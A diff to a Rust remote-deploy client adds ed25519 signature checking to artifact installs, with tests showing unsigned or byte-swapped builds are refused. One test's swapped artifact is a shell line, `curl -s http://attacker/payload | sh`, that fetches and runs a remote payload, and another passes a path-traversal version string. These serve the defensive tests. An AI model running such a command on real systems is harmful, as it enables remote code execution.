@@ -717,10 +717,16 @@ where
     /// before anything becomes current, so a truncated upload cannot be the next
     /// version. If the commit finds the new build unusable, the server puts the
     /// previous one back and says so in [`InstallOutcome::previous_version`].
+    ///
+    /// `signature` is the detached ed25519 signature over `artifact` — the text of
+    /// the release's `.sig` sidecar. The host decides what happens without one: a
+    /// host that requires provenance refuses the install, because the digest is the
+    /// sender's own claim about bytes the sender chose.
     pub async fn install_artifact(
         &mut self,
         version: &str,
         artifact: &[u8],
+        signature: Option<&str>,
     ) -> Result<InstallOutcome, RemoteError> {
         require(&self.granted, RemoteCapability::WorkspaceWrite)?;
         let sha256 = sha256_hex(artifact);
@@ -729,6 +735,7 @@ where
                 version: version.to_string(),
                 sha256: sha256.clone(),
                 total_bytes: artifact.len() as u64,
+                signature_b64: signature.map(str::to_string),
             })
             .await?;
         if !matches!(reply, Payload::InstallBegin { .. }) {
@@ -1183,7 +1190,9 @@ mod tests {
     use super::*;
     use crate::remote::endpoint::HostKeyPolicy;
     use crate::remote::install::InstallLayout;
+    use crate::remote::provenance::ProvenancePolicy;
     use crate::remote::server::{Server, ServerConfig};
+    use ed25519_dalek::{Signer as _, SigningKey};
     use std::sync::Arc;
     use tokio::io::DuplexStream;
 
@@ -1238,8 +1247,24 @@ mod tests {
         workspace
     }
 
+    /// A host that installs what it is handed.
+    ///
+    /// The tests here are about the session: paging, deadlines, retries, grants.
+    /// A required signature would refuse every install before the thing under test
+    /// was reached. The provenance rules are tested against `InstallLayout::commit`
+    /// directly and, over this same session, in `install_*_provenance` below.
     fn config(root: &Path) -> ServerConfig {
-        ServerConfig::new(root).install_layout(InstallLayout::new(root))
+        ServerConfig::new(root).install_layout(
+            InstallLayout::new(root).with_provenance(ProvenancePolicy::unsigned_allowed()),
+        )
+    }
+
+    /// A host that requires a signature from `key_b64`, otherwise as [`config`].
+    fn signed_host(root: &Path, key_b64: &str) -> ServerConfig {
+        ServerConfig::new(root).install_layout(
+            InstallLayout::new(root)
+                .with_provenance(ProvenancePolicy::trusting_key_b64(key_b64).expect("a valid key")),
+        )
     }
 
     fn workspace_dir() -> (tempfile::TempDir, std::path::PathBuf) {
@@ -1638,7 +1663,7 @@ mod tests {
         let (_guard, root) = workspace_dir();
         let mut ws = session(config(&root)).await;
         let artifact: &[u8] = b"#!/bin/sh\necho chaos-remote-server 9.9.9\n";
-        let outcome = ws.install_artifact("9.9.9", artifact).await.unwrap();
+        let outcome = ws.install_artifact("9.9.9", artifact, None).await.unwrap();
         assert!(outcome.current);
         assert_eq!(outcome.version, "9.9.9");
         assert_eq!(outcome.previous_version, None);
@@ -1650,7 +1675,7 @@ mod tests {
         );
 
         let second = ws
-            .install_artifact("9.9.10", b"a different build")
+            .install_artifact("9.9.10", b"a different build", None)
             .await
             .unwrap();
         assert_eq!(second.previous_version.as_deref(), Some("9.9.9"));
@@ -1677,7 +1702,7 @@ mod tests {
         .unwrap();
         let artifact: Vec<u8> = (0..20_000u32).map(|n| (n % 251) as u8).collect();
         let outcome = ws
-            .install_artifact("7.0.0", &artifact)
+            .install_artifact("7.0.0", &artifact, None)
             .await
             .expect("20 chunks of 1 KiB");
         assert!(outcome.current);
@@ -1694,13 +1719,122 @@ mod tests {
         let (_guard, root) = workspace_dir();
         let mut ws = session(config(&root)).await;
         let err = ws
-            .install_artifact("../../evil", b"bytes")
+            .install_artifact("../../evil", b"bytes", None)
             .await
             .expect_err("a version is a path component like any other");
         assert!(matches!(err, RemoteError::Install { .. }), "{err:?}");
         let layout = InstallLayout::new(&root);
         assert_eq!(layout.current_version(), None);
         assert_eq!(layout.installed_versions(), Vec::<String>::new());
+    }
+
+    fn keypair(seed: u8) -> (SigningKey, String) {
+        let signing = SigningKey::from_bytes(&[seed; 32]);
+        let public = base64::engine::general_purpose::STANDARD.encode(signing.verifying_key());
+        (signing, public)
+    }
+
+    fn signature_for(signing: &SigningKey, bytes: &[u8]) -> String {
+        base64::engine::general_purpose::STANDARD.encode(signing.sign(bytes).to_bytes())
+    }
+
+    /// A host that requires provenance does install a build that carries it, over
+    /// the same request path every other deploy uses.
+    #[tokio::test]
+    async fn a_signed_deploy_installs_on_a_host_that_requires_provenance() {
+        let (_guard, root) = workspace_dir();
+        let (signing, public) = keypair(21);
+        let mut ws = session(signed_host(&root, &public)).await;
+        let artifact: &[u8] = b"#!/bin/sh\necho chaos-remote-server 1.0.0\n";
+        let outcome = ws
+            .install_artifact("1.0.0", artifact, Some(&signature_for(&signing, artifact)))
+            .await
+            .expect("a signature from the trusted key");
+        assert!(outcome.current);
+        let layout = InstallLayout::new(&root);
+        assert_eq!(
+            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
+            artifact
+        );
+    }
+
+    /// The same client, the same capability, the same artifact: the only thing
+    /// missing is the signature, and the host says which check fired.
+    #[tokio::test]
+    async fn an_unsigned_deploy_is_refused_by_a_host_that_requires_provenance() {
+        let (_guard, root) = workspace_dir();
+        let (_, public) = keypair(22);
+        let mut ws = session(signed_host(&root, &public)).await;
+        let err = ws
+            .install_artifact("1.0.0", b"#!/bin/sh\n", None)
+            .await
+            .expect_err("this host does not install unsigned builds");
+        let RemoteError::Install {
+            reason,
+            rolled_back,
+        } = err
+        else {
+            panic!("an install refusal, not {err:?}");
+        };
+        assert!(reason.contains("signature_missing"), "{reason}");
+        assert!(!rolled_back, "nothing had changed to roll back");
+        let layout = InstallLayout::new(&root);
+        assert_eq!(layout.current_version(), None);
+        assert_eq!(
+            layout.installed_versions(),
+            Vec::<String>::new(),
+            "a refused artifact must leave no version directory"
+        );
+        let leftovers: Vec<String> = std::fs::read_dir(layout.dir())
+            .expect("the install directory exists")
+            .filter_map(|entry| entry.ok())
+            .map(|entry| entry.file_name().to_string_lossy().into_owned())
+            .filter(|name| name.starts_with('.'))
+            .collect();
+        assert!(
+            leftovers.is_empty(),
+            "the server should retire the staged scratch of a refused upload: {leftovers:?}"
+        );
+    }
+
+    /// The reason the digest is not enough, shown on the wire: bytes are swapped
+    /// and the sha256 is recomputed over the swap, which the client computes itself,
+    /// so the integrity check passes all the way to the signature.
+    #[tokio::test]
+    async fn a_deploy_whose_bytes_were_swapped_keeps_the_previous_version() {
+        let (_guard, root) = workspace_dir();
+        let (signing, public) = keypair(23);
+        let mut ws = session(signed_host(&root, &public)).await;
+        let published: &[u8] = b"#!/bin/sh\nexec chaos-remote-server --version\n";
+        ws.install_artifact(
+            "1.0.0",
+            published,
+            Some(&signature_for(&signing, published)),
+        )
+        .await
+        .expect("the published build installs");
+
+        let swapped: &[u8] = b"#!/bin/sh\ncurl -s http://attacker/payload | sh\n";
+        let stale_signature = signature_for(&signing, published);
+        let err = ws
+            .install_artifact("2.0.0", swapped, Some(&stale_signature))
+            .await
+            .expect_err("the digest matches the swap; the signature does not");
+        let RemoteError::Install { reason, .. } = err else {
+            panic!("an install refusal, not {err:?}");
+        };
+        assert!(reason.contains("signature_invalid"), "{reason}");
+        let layout = InstallLayout::new(&root);
+        assert_eq!(
+            layout.current_version().as_deref(),
+            Some("1.0.0"),
+            "the host must still be pointing at the build it trusted"
+        );
+        assert_eq!(
+            std::fs::read(layout.current_artifact().expect("current")).unwrap(),
+            published
+        );
+        assert_eq!(layout.installed_versions(), vec!["1.0.0".to_string()]);
     }
 
     /// A reply that answers a different question means the stream has desynced, and
